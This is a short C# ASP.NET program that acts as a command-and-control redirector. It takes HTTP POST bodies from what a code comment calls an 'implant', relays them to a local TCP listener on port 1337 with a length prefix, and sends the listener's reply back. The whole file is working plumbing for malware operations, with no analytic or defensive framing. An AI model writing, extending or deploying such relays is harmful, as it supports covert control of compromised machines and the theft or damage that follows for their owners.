using System.Buffers.Binary;
using System.Net;
using System.Net.Sockets;

namespace forwarder;

public sealed class Program
{
    public static void Main(string[] args)
    {
        var builder = WebApplication.CreateBuilder(args);
        var app = builder.Build();

        app.MapPost("/", async (HttpContext ctx) =>
        {
            try
            {
                await using var ms = new MemoryStream();
                await ctx.Request.Body.CopyToAsync(ms);

                var body = ms.ToArray();

                // connect to listener
                using var client = new TcpClient();
                await client.ConnectAsync(new IPEndPoint(IPAddress.Loopback, 1337));
                await using var stream = client.GetStream();

                // write body length
                var lenBuf = new byte[4];
                BinaryPrimitives.WriteInt32LittleEndian(lenBuf.AsSpan(), body.Length);
                await stream.WriteAsync(lenBuf.AsMemory());

                // write the data
                await stream.WriteAsync(body.AsMemory());
                await stream.FlushAsync();

                // read response (reuse lenbuf)
                _ = await stream.ReadAsync(lenBuf.AsMemory());

                var dataLen = BinaryPrimitives.ReadInt32LittleEndian(lenBuf.AsSpan());
                var data = new byte[dataLen];
                await stream.ReadExactlyAsync(data, 0, dataLen);

                // return to implant
                return Results.File(data, "application/octet-stream");
            }
            catch
            {
                // blah
            }
            
            return Results.BadRequest();
        });

        app.Run();
    }
}